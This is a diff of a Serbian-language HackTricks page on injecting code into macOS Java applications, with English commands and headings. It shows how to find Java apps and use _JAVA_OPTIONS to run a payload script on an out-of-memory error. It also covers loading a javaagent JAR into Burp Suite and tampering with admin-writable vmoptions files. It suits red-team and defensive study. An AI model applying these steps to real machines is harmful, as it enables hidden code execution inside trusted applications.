@@ -1,22 +1,23 @@
-# Ubacivanje Java aplikacija u macOS
+# macOS Java Applications Injection
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Enumeracija
+## Enumeration
 
-Pronađite Java aplikacije instalirane na vašem sistemu. Primećeno je da Java aplikacije u **Info.plist** sadrže neke Java parametre koji sadrže string **`java.`**, pa možete pretražiti to:
+Pronađite Java aplikacije instalirane na vašem sistemu. Primećeno je da Java aplikacije u **Info.plist** sadrže neke java parametre koji sadrže string **`java.`**, tako da možete pretraživati za tim:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,7 +27,7 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubacivanje proizvoljnih Java parametara prilikom izvršavanja Java kompajlirane aplikacije:
+Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubrizgavanje proizvoljnih java parametara u izvršavanje java kompajlirane aplikacije:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Međutim, to će izazvati grešku na izvršenoj aplikaciji, drugi, još prikriveniji način je da se kreira Java agent i koristi:
+Međutim, to će izazvati grešku na izvršnoj aplikaciji, drugi, suptilniji način je da se kreira java agent i koristi:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,7 +96,7 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Kreiranje agenta sa **različitom verzijom Java-e** od aplikacije može izazvati pad izvršavanja kako agenta tako i aplikacije.
+Kreiranje agenta sa **drugom verzijom Jave** od aplikacije može uzrokovati pad izvršavanja i agenta i aplikacije
 {% endhint %}
 
 Gde agent može biti:
@@ -131,7 +132,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-A zatim izvezite env varijablu i pokrenite Java aplikaciju na sledeći način:
+I zatim eksportujte env varijablu i pokrenite java aplikaciju kao:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -140,14 +141,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions fajl
+## vmoptions datoteka
 
-Ovaj fajl podržava specifikaciju **Java parametara** prilikom izvršavanja Java programa. Možete koristiti neke od prethodnih trikova da promenite Java parametre i **izvršite proizvoljne komande** u procesu.\
-Osim toga, ovaj fajl može **uključivati druge fajlove** iz `include` direktorijuma, tako da možete promeniti i uključeni fajl.
+Ova datoteka podržava specifikaciju **Java parametara** kada se Java izvršava. Možete koristiti neke od prethodnih trikova da promenite java parametre i **naterate proces da izvrši proizvoljne komande**.\
+Štaviše, ova datoteka može takođe **uključivati druge** sa `include` direktorijumom, tako da možete promeniti i uključenu datoteku.
 
-Dodatno, neke Java aplikacije će **učitati više od jednog `vmoptions`** fajla.
+Još više, neke Java aplikacije će **učitati više od jedne `vmoptions`** datoteke.
 
-Neki programi kao što je Android Studio će u svom **izlazu naznačiti gde traže** ove fajlove, na primer:
+Neke aplikacije poput Android Studija ukazuju u svom **izlazu gde traže** ove datoteke, kao:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -158,7 +159,7 @@ Neki programi kao što je Android Studio će u svom **izlazu naznačiti gde tra�
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Ako to nije slučaj, lako možete provjeriti to sa:
+Ako to ne urade, možete lako proveriti pomoću:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,18 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Primetite kako je interesantno da Android Studio u ovom primeru pokušava da učita datoteku **`/Applications/Android Studio.app.vmoptions`**, mesto gde svaki korisnik iz **`admin` grupe ima pristup za pisanje**.
-
-<details>
-
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
-
-Drugi načini da podržite HackTricks:
-
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
-
-</details>
+Napomena koliko je zanimljivo da Android Studio u ovom primeru pokušava da učita datoteku **`/Applications/Android Studio.app.vmoptions`**, mesto gde svaki korisnik iz **`admin` grupe ima pristup za pisanje.**
